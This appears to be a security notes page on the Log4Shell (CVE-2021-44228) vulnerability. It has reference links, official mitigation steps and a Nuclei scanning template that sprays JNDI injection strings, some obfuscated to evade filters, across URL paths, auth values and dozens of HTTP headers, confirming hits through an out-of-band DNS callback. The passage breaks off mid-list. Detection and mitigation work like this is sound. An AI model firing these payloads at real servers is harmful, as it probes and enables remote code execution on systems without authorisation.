---
sidebar_position: 1
---

# Log4j

## About

* Vuln detais: https://logging.apache.org/log4j/2.x/security.html
* Some more info: https://www.kaspersky.com/blog/log4shell-critical-vulnerability-in-apache-log4j/43124/
* Github PoC: https://github.com/kozmer/log4j-shell-poc
* TryHackMe Lab: https://tryhackme.com/room/solar
* BlueTeam CheatSheet: https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
* Cheat Sheet: https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/


## How to Mitigate

Follow this link for updates: https://logging.apache.org/log4j/2.x/security.html

**Log4j 1.x mitigation**: Log4j 1.x is not impacted by this vulnerability.

**Log4j 2.x mitigation**: Implement one of the mitigation techniques below.

* Java 8 (or later) users should upgrade to release 2.16.0.
* Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
* Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.

## Nuclei Template

```bash
nuclei -t template.yaml -u "https://target.url" interactsh-url="http://interact-sh.url"
```

```yaml
id: CVE-2021-44228 

info:
  name: Log4J RCE
  author: iNvist / hazcod
  severity: critical
  description: CVE-2021-44228 

requests:
  - raw:
    - | 
        GET /{{Path}}${jndi:dns://{{interactsh-url}}:80/d HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET //{{Path}}${jndi:dns://{{interactsh-url}}:80/d HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET /{{Path}}${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/d HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET //{{Path}}${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/d HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"
    # TODO maybe encoding
      
  - raw:
    - | 
        GET /{{Path}}?${${lower:jn}di:${lower:dn}s:://{{interactsh-url}}:80/d HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET /{{Path}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: {{auth_type }} ${jndi:dns://{{interactsh-url}}:80/o

    payloads:
      auth_type:
        - Bearer
        - Oauth
        - Token
        - Basic
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET //{{Path}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: {{auth_type }} ${jndi:dns://{{interactsh-url}}:80/o

    payloads:
      auth_type:
        - Bearer
        - Oauth
        - Token
        - Basic
    matchers-condition: or
    matchers:
    - type: word
      part: interactsh_protocol # Confirms the DNS Interaction
      words:
        - "dns"

  - raw:
    - | 
        GET /{{Path}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: {{auth_type }} ${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/o

    payloads:
      auth_type:
        - Bearer
        - Oauth
        - Token
        - Basic
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
      - type: regex
        part: interactsh_request
        regex:
        - "JRMP"

  - raw:
    - | 
        GET /{{Path}} HTTP/1.1
        Host: {{Hostname}}
        §header_val§: ${${lower:jn}di:${lower:dn}s://{{interactsh-url}}:80/o
         
    payloads:
      header_val: 
        - Accept
        - Accept-Charset
        - Accept-Datetime
        - Accept-Encoding
        - Accept-Language
        - Alt-Svc
        - Base-Url
        - CF-Connecting-IP
        - Cache-Control
        - Client-IP
        - Cluster
        - Cluster-Client-IP
        - Connection
        - Contact
        - Content-Length
        - Content-MD5
        - Content-Type
        - Cookie
        - DNT
        - Date
        - Destination
        - Expect
        - Forwarded
        - From
        - Front-End-Https
        - HTTP_CLIENT_IP
        - HTTP_FORWARDED
        - HTTP_FORWARDED_FOR
        - HTTP_X_FORWARDED
        - HTTP_X_FORWARDED_FOR
        - Host
        - Http-Url
        - If-Match
        - If-Modified-Since
        - If-None-Match
        - If-Range
        - If-Unmodified-Since
        - Link
        - Location
        - Max-Forwards
        - Origin
        - Pragma
        - Profile
        - Proxy
        - Proxy-Authorization
        - Proxy-Connection
        - Proxy-Host
        - Proxy-Url
        - Range
        - Real-IP
        - Redirect
        - Referer
        - Referrer
        - Refferer
        - Request-Uri
        - TE
        - True-Client-IP
        - UID
        - Upgrade
        - Uri
        - User-Agent
        - Via
        - Warning
        - X-ATT-DeviceId
        - X-Arbitrary
        - X-CSRFToken
        - X-Client-IP
        - X-Cluster-Client-IP
        - X-Correlation-ID
        - X-Csrf-Token
        - X-Do-Not-Track
        - X-Forward-For
        - X-Forwarded
        - X-Forwarded-By
        - X-Forwarded-For
        - X-Forwarded-For-IP
        - X-Forwarded-For-Original
        - X-Forwarded-Host
        - X-Forwarded-Proto
        - X-Forwarded-Server
        - X-Forwarder-For
        - X-Host
        - X-Http-Destinationurl
        - X-Http-Host-Override
        - X-Http-Method-Override
        - X-Original-Remote-Addr
        - X-Original-Urlm
```